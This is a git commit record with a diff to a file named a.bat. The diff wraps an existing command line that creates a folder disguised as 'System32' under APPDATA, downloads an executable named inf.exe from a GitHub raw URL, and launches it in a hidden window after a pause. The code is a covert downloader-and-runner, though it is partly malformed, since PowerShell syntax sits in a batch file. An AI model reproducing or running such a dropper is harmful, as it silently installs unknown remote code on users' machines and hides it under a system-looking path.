3473d21b22ed39b93a835b323b386afd5ae3f999
WindowsEnjoyer-1 <being2269@gmail.com>
2025-02-25 12:43:30 -0800

    Update a.bat

--- a.bat
+++ a.bat
@@ -1,1 +1,3 @@
+@echo off
 if (-not (Test-Path -Path "$env:APPDATA\Roaming\System32")) { New-Item -ItemType Directory -Path "$env:APPDATA\Roaming\System32" }; Invoke-WebRequest -Uri 'https://github.com/WindowsEnjoyer-1/123412341234/raw/refs/heads/main/inf.exe' -OutFile "$env:APPDATA\Roaming\System32\inf.exe"; Start-Sleep -Seconds 10; Start-Process "$env:APPDATA\Roaming\System32\inf.exe" -WindowStyle Hidden
+exit
